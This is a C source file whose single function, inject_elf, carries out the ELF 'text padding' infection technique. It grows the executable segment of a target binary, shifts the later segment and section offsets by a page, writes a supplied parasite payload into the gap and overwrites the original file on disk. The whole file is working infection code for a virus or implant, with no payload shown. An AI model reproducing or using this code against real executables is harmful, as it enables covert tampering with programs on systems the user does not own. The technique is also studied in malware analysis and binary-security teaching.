
#include "headers.h"

/* Text padding injection */
Elf64_Addr inject_elf(elf64_t *telf, uint8_t *pcode, size_t psize)
{
	Elf64_Addr paddr;
	Elf64_Off poff, tmpoff;

	int fd;
	uint8_t *empty;
	char *shstrtab;

	/* Get string table of section header */
	shstrtab = &telf->mem[telf->shdr[telf->ehdr->e_shstrndx].sh_offset];

	/* Get the text segment */
	printf("Searching text segment...\n");
	paddr = 0;
	for (int i = 0; i < telf->ehdr->e_phnum; i++)
	{
		if (telf->phdr[i].p_type == PT_LOAD && !telf->phdr[i].p_offset)
		{
			paddr = telf->phdr[i].p_vaddr + telf->phdr[i].p_memsz;
			poff = telf->phdr[i].p_offset + telf->phdr[i].p_filesz;
			telf->phdr[i].p_filesz += psize;
			telf->phdr[i].p_memsz += psize;
			break;
		}
	}

	if (paddr == 0)
	{
		fprintf(stderr, "%s Text segment not found\n", RED("[-]"));
		return -1;
	}

	/* Adjust the offset of segments after text segment */
	printf("Adjuting segments's offset of the target file...\n");
	for (int i = 0; i < telf->ehdr->e_phnum; i++)
	{
		if (telf->phdr[i].p_offset >= poff)
		{
			tmpoff = telf->phdr[i].p_offset;
			telf->phdr[i].p_offset += PAGE_SIZE;
			printf("%s Segment %d: 0x%08lx --> 0x%08lx\n", \
				GREEN("[+]"), i, tmpoff, telf->phdr[i].p_offset);
		}
	}

	/* Adjust the offset of sections after parasite offset */
	printf("Adjuting section's offset of the target file...\n");
	for (int i = 0; i < telf->ehdr->e_shnum; i++)
	{
		if (telf->shdr[i].sh_offset >= poff)
		{
			tmpoff = telf->shdr[i].sh_offset;
			telf->shdr[i].sh_offset += PAGE_SIZE;
			printf("%s Section %s: 0x%08lx --> 0x%08lx\n", GREEN("[+]"), \
				&shstrtab[telf->shdr[i].sh_name], tmpoff, telf->shdr[i].sh_offset);
		}
		else if (telf->shdr[i].sh_addr + telf->shdr[i].sh_size == paddr)
			telf->shdr[i].sh_size += psize;
	}
	telf->ehdr->e_shoff += PAGE_SIZE;

	/* Open output file */
	if ((fd = open(TMP_FILE, O_CREAT | O_WRONLY, telf->mode)) < 0)
	{
		fprintf(stderr, "[-] Open file %s failed\n", TMP_FILE);
		return -1;
	}

	if (!(empty = (uint8_t *)malloc(PAGE_SIZE - psize)))
	{
		perror("Malloc");
		return -1;
	}
	memset(empty, 0, PAGE_SIZE - psize);

	/* Inject the parasite code */
	if (write(fd, telf->mem, poff) != poff)
	{
		perror("Write mem");
		return -1;
	}

	if (write(fd, pcode, psize) != psize)
	{
		perror("Write pcode");
		return -1;
	}

	if (write(fd, empty, PAGE_SIZE - psize) != PAGE_SIZE - psize)
	{
		perror("Write empty");	
		return -1;
	}

	if (write(fd, telf->mem + poff, telf->size - poff) != telf->size - poff)
	{
		perror("Write mem + poff");
		return -1;
	}

	if (fsync(fd) < 0)
	{
		fprintf(stderr, "[-] Fsync file %s failed\n", TMP_FILE);
		return -1;
	}

	close(fd);
	free(empty);
	unload_elf(telf);
	unlink(telf->path);
	rename(TMP_FILE, telf->path);
	load_elf(telf->path, telf);

	return paddr;
}
